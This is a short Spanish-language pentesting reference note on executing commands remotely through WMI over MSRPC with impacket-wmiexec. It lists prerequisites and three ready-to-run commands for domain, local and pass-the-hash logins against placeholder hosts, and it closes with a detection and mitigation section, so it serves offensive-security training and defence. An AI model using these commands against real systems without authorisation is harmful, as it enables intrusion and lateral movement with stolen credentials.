---
title: Conectarse por RPC (WMI)
resumen: Ejecución de comandos instanciando el proceso vía WMI sobre MSRPC (puerto 135), sin instalar ningún servicio en el objetivo.
tags: wmiexec, netexec
---

## Definición

Conexión que interactúa directamente con **WMI** (*Windows Management Instrumentation*) a través de **MSRPC** (puerto 135) para instanciar el proceso `cmd.exe` en la máquina de destino y ejecutar comandos. A diferencia de [[conectarse-como-system|psexec]], no crea ni instala ningún servicio en el equipo remoto — la ejecución es más discreta a nivel de artefactos que deja atrás, aunque genera su propio patrón de tráfico RPC reconocible.

## Cuándo se usa

Con credenciales privilegiadas de administrador (contraseña o hash NTLM), a nivel local o de dominio, cuando se prefiere no dejar un servicio nuevo creado en el registro del objetivo (como sí hace [[conectarse-como-system|psexec]]) o cuando el puerto 445 está más vigilado que el 135.

## Requisitos previos

- Credenciales de administrador (local o de dominio) del equipo objetivo.
- Puerto 135 (MSRPC) accesible, además de un puerto DCOM alto efímero que se negocia dinámicamente.

## Desarrollo del ataque

1. Confirmar privilegios administrativos sobre el objetivo (por ejemplo, con netexec).
2. Conectarse con `wmiexec`, a nivel de dominio o local, con contraseña o con hash NTLM.

```bash
# Conectarse mediante credenciales a nivel dominio
impacket-wmiexec dominio.local/usuario:'contraseña'@10.10.10.X

# Conectarse mediante credenciales a nivel local
impacket-wmiexec usuario:'contraseña'@10.10.10.X

# Conectarse mediante hash NTLM (Pass the Hash) a nivel dominio
impacket-wmiexec -hashes :hash dominio.local/usuario@10.10.10.X
```

## Herramientas relacionadas

- Ver [[wmiexec]]
- Ver [[netexec]] (comprobación previa de privilegios)

## Detección y mitigación

Auditar el uso del servicio WMI para ejecución remota (eventos de creación de proceso con `WmiPrvSE.exe` como padre), restringir qué cuentas pueden usar DCOM remoto, y correlacionar tráfico RPC hacia el puerto 135 seguido de creación de procesos en el equipo de destino.
